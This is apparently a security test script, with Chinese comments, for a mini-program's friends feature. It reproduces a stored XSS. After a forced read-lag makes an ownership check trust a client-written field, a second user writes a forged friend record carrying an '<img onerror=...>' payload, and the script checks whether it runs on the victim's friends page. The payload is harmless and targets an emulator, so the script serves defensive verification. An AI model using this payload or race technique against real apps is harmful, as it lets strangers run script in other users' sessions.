/* E4: 好友卡片里的「No.<cid>」没转义。cid 来自好友记录的 friend 字段（客户端随便写）。
 *   正常情况下 isMine() 只认自己 _openid 的记录，冒充的进不来；
 *   但只要本次会话里没学到自己的 _openid（第一次写在线记录后读回超时：读延迟 > ~2.3 秒），
 *   isMine() 对所有 owner=我 的记录都返回 true（代码注释：云端不盖 _openid 的环境只能信 owner 字段）。
 *   这时陌生人 C 写一条 {kind:'friend', owner:A.cid, friend:'<img onerror=…>'}，A 打开好友页就执行了 C 的脚本。
 */
import * as H from '/home/user/wordminiprogram/cloudbase_e2e_harness.mjs';

const LAG_FIRST = Number(process.env.LAG_FIRST || 3000);
const READY = () => !!(window.HansenAuth && window.HansenFriends && window.HansenFriendsUI && window.HansenSbProfile);
const srv = await H.startStatic();
const browser = await H.launchBrowser();
const j = (x) => JSON.stringify(x);
try {
  const emu = H.makeEmulator({ knobs: { permissionMode: 'legacy', latencyMs: 30, jitterMs: 30 } });
  for (const u of ['alice', 'mallory']) emu.seedUser({ username: u, password: 'pw123456' });
  /* 页面加载 3 秒后好友模块会自动写在线记录：先把延迟调高，让那一次读回超时 */
  const A = await H.openPhone(browser, emu, srv.origin, { name: 'A', ready: READY });
  await A.eval(() => window.HansenSbProfile.setName('小爱'));
  const ra = await H.loginPassword(A, 'alice', 'pw123456');
  const aCid = await A.eval(() => (window.HansenSbProfile.readProfile() || {}).cid || 0);
  emu.knobs.consistencyLagMs = LAG_FIRST;
  const b = await A.eval(async () => { const r = await window.HansenFriends._beat(); return { r, openid: window.HansenFriends._myOpenid() }; });
  emu.knobs.consistencyLagMs = 0;
  console.log(`[A] login=${ra.ok} cid=${aCid} first beat with ${LAG_FIRST}ms read lag -> ${j(b)}`);

  const C = await H.openPhone(browser, emu, srv.origin, { name: 'C', ready: READY });
  await C.eval(() => window.HansenSbProfile.setName('路人'));
  await H.loginPassword(C, 'mallory', 'pw123456');
  const w = await C.eval(async (aCid) => {
    const db = (await window.HansenAuth._app()).database();
    const r = await db.collection('hansen_friends').add({ kind: 'friend', owner: aCid, friend: '<img src=x onerror="window.__pwn=(window.__pwn||0)+1;document.title=\'PWNED\'">', name: '同学', at: Date.now() });
    return !!(r && (r.id || r._id));
  }, aCid);
  console.log('[C] wrote forged friend row (own row, legal under READONLY):', w);

  await H.sleep(500);
  const res = await A.eval(async () => {
    window.HansenFriendsUI.open();
    await new Promise((r) => setTimeout(r, 3500));
    const el = document.getElementById('hsn_friends_screen');
    const html = el ? el.innerHTML : '';
    const i = html.indexOf('<img');
    return { pwn: window.__pwn || 0, title: document.title, imgInList: i >= 0 ? html.slice(i, i + 90) : '' };
  });
  console.log('[A] after opening friends page:', j(res));
  console.log(res.pwn ? 'RESULT: stranger-controlled script executed on A\'s friends page' : 'RESULT: no script execution');
  await A.close(); await C.close();
} finally {
  await browser.close().catch(() => {});
  srv.close();
}
